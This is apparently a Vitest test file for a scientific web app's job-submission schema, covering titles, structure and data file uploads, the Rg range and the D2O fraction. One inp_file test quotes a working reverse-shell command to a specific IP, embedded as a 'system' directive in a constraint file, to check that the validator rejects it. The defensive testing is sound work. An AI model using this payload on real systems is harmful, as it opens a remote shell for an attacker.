import { describe, it, expect, vi } from 'vitest'
import { BilboMDSANSJobSchema } from '../BilboMDSANSJobSchema'
import * as ValidationFunctions from '../ValidationFunctions'

vi.mock('../ValidationFunctions', () => ({
  noSpaces: vi.fn().mockResolvedValue(true),
  isSaxsData: vi.fn().mockResolvedValue({ valid: true }),
  isSingleModel: vi.fn().mockResolvedValue(true),
  cifIsSingleModel: vi.fn().mockResolvedValue(true),
  cifContainsChainId: vi.fn().mockResolvedValue(true),
  cifHasAllowedResiduesOnly: vi
    .fn()
    .mockResolvedValue({ valid: true, unsupportedResidues: [] }),
  containsChainId: vi.fn().mockResolvedValue(true),
  hasAllowedResiduesOnly: vi
    .fn()
    .mockResolvedValue({ valid: true, unsupportedResidues: [] }),
  isValidConstInpFile: vi.fn().mockResolvedValue(true)
}))

const makeFile = (name: string, size = 100): File => {
  const blob = new Blob(['x'.repeat(size)], { type: 'text/plain' })
  const file = new File([blob], name, { type: 'text/plain' })
  Object.defineProperty(file, 'size', { value: size })
  return file
}

describe('BilboMDSANSJobSchema - md_engine', () => {
  it('allows charmm and openmm', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('md_engine', { md_engine: 'charmm' })
    ).resolves.toBe('charmm')
    await expect(
      BilboMDSANSJobSchema.validateAt('md_engine', { md_engine: 'openmm' })
    ).resolves.toBe('openmm')
  })

  it('rejects invalid md_engine', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('md_engine', { md_engine: 'invalid' })
    ).rejects.toBeTruthy()
  })
})

describe('BilboMDSANSJobSchema - title', () => {
  it('accepts valid title', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('title', { title: 'My SANS Job' })
    ).resolves.toBe('My SANS Job')
  })

  it('rejects title shorter than 4 characters', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('title', { title: 'abc' })
    ).rejects.toThrow('at least 4 characters')
  })

  it('rejects title longer than 30 characters', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('title', { title: 'a'.repeat(31) })
    ).rejects.toThrow('less than 30 characters')
  })

  it('rejects title with special characters', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('title', { title: 'Bad@Title!' })
    ).rejects.toThrow('No special characters')
  })

  it('rejects missing title', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('title', { title: undefined })
    ).rejects.toBeTruthy()
  })

  it('accepts title with hyphens and spaces', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('title', { title: 'My-SANS Job' })
    ).resolves.toBe('My-SANS Job')
  })
})

describe('BilboMDSANSJobSchema - pdb_file', () => {
  it('accepts valid .pdb file under 20MB', async () => {
    const file = makeFile('model.pdb')
    await expect(
      BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: file })
    ).resolves.toBe(file)
  })

  it('accepts valid .cif file under 20MB', async () => {
    const file = makeFile('model.cif')
    await expect(
      BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: file })
    ).resolves.toBe(file)
  })

  it('rejects file over 20MB', async () => {
    const file = makeFile('model.pdb', 20_000_001)
    await expect(
      BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: file })
    ).rejects.toThrow('Max file size is 20MB')
  })

  it('rejects non-.pdb/.cif extension', async () => {
    const file = makeFile('model.txt')
    await expect(
      BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: file })
    ).rejects.toThrow('Only accepts a *.pdb or *.cif file.')
  })

  it('rejects filename longer than 30 characters', async () => {
    const file = makeFile('a'.repeat(27) + '.pdb')
    await expect(
      BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: file })
    ).rejects.toThrow('no longer than 30 characters')
  })

  it('rejects missing pdb_file', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('pdb_file', { pdb_file: undefined })
    ).rejects.toThrow('A PDB or CIF file is required')
  })
})

describe('BilboMDSANSJobSchema - dat_file', () => {
  it('accepts valid .dat file under 2MB', async () => {
    const file = makeFile('data.dat')
    await expect(
      BilboMDSANSJobSchema.validateAt('dat_file', { dat_file: file })
    ).resolves.toBe(file)
  })

  it('rejects file over 2MB', async () => {
    const file = makeFile('data.dat', 2_000_001)
    await expect(
      BilboMDSANSJobSchema.validateAt('dat_file', { dat_file: file })
    ).rejects.toThrow('Max file size is 2MB')
  })

  it('rejects non-.dat extension', async () => {
    const file = makeFile('data.txt')
    await expect(
      BilboMDSANSJobSchema.validateAt('dat_file', { dat_file: file })
    ).rejects.toThrow('*.dat file')
  })

  it('rejects filename longer than 30 characters', async () => {
    const file = makeFile('a'.repeat(27) + '.dat')
    await expect(
      BilboMDSANSJobSchema.validateAt('dat_file', { dat_file: file })
    ).rejects.toThrow('no longer than 30 characters')
  })

  it('rejects when isSaxsData returns invalid', async () => {
    vi.mocked(ValidationFunctions.isSaxsData).mockResolvedValueOnce({
      valid: false,
      message: 'Bad SAXS data'
    })
    const file = makeFile('bad.dat')
    await expect(
      BilboMDSANSJobSchema.validateAt('dat_file', { dat_file: file })
    ).rejects.toThrow('Bad SAXS data')
  })
})

describe('BilboMDSANSJobSchema - inp_file', () => {
  it('accepts valid .inp file under 2MB', async () => {
    const file = makeFile('const.inp')
    await expect(
      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
    ).resolves.toBe(file)
  })

  it('rejects inp_file containing a system directive (reverse shell exploit)', async () => {
    vi.mocked(ValidationFunctions.isValidConstInpFile).mockResolvedValueOnce(
      'Disallowed keyword in constraint file: "system "bash -i >& /dev/tcp/173.230.129.114/4444 0>&1""'
    )
    const file = makeFile('const.inp')
    await expect(
      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
    ).rejects.toThrow('Disallowed keyword')
  })

  it('rejects non-.inp extension', async () => {
    const file = makeFile('const.txt')
    await expect(
      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
    ).rejects.toThrow('Only accepts a *.inp file.')
  })

  it('rejects file over 2MB', async () => {
    const file = makeFile('const.inp', 2_000_001)
    await expect(
      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
    ).rejects.toThrow('Max file size is 2MB')
  })

  it('rejects filename longer than 30 characters', async () => {
    const file = makeFile('a'.repeat(27) + '.inp')
    await expect(
      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
    ).rejects.toThrow('no longer than 30 characters')
  })

  it('rejects missing inp_file', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: undefined })
    ).rejects.toBeTruthy()
  })
})

describe('BilboMDSANSJobSchema - rg_min', () => {
  it('accepts value between 10 and 100', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_min', { rg_min: 30 })
    ).resolves.toBe(30)
  })

  it('accepts boundary values 10 and 100', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_min', { rg_min: 10 })
    ).resolves.toBe(10)
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_min', { rg_min: 100 })
    ).resolves.toBe(100)
  })

  it('rejects value below 10', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_min', { rg_min: 9 })
    ).rejects.toBeTruthy()
  })

  it('rejects value above 100', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_min', { rg_min: 101 })
    ).rejects.toBeTruthy()
  })

  it('rejects missing rg_min', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_min', { rg_min: undefined })
    ).rejects.toBeTruthy()
  })
})

describe('BilboMDSANSJobSchema - rg_max', () => {
  it('accepts rg_max greater than rg_min', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_max', { rg_min: 20, rg_max: 50 })
    ).resolves.toBe(50)
  })

  it('rejects rg_max equal to rg_min', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_max', { rg_min: 30, rg_max: 30 })
    ).rejects.toThrow('greater than Rg Minimum')
  })

  it('rejects rg_max less than rg_min', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_max', { rg_min: 50, rg_max: 30 })
    ).rejects.toThrow('greater than Rg Minimum')
  })

  it('rejects value below 10', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_max', { rg_min: 5, rg_max: 9 })
    ).rejects.toBeTruthy()
  })

  it('rejects value above 100', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('rg_max', { rg_min: 20, rg_max: 101 })
    ).rejects.toBeTruthy()
  })
})

describe('BilboMDSANSJobSchema - d2o_fraction', () => {
  it('accepts values between 0 and 100', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('d2o_fraction', { d2o_fraction: 0 })
    ).resolves.toBe(0)
    await expect(
      BilboMDSANSJobSchema.validateAt('d2o_fraction', { d2o_fraction: 50 })
    ).resolves.toBe(50)
    await expect(
      BilboMDSANSJobSchema.validateAt('d2o_fraction', { d2o_fraction: 100 })
    ).resolves.toBe(100)
  })

  it('rejects value below 0', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('d2o_fraction', { d2o_fraction: -1 })
    ).rejects.toThrow('cannot be less than 0')
  })

  it('rejects value above 100', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('d2o_fraction', { d2o_fraction: 101 })
    ).rejects.toThrow('cannot be more than 100')
  })

  it('rejects missing d2o_fraction', async () => {
    await expect(
      BilboMDSANSJobSchema.validateAt('d2o_fraction', {
        d2o_fraction: undefined
      })
    ).rejects.toBeTruthy()
  })
})
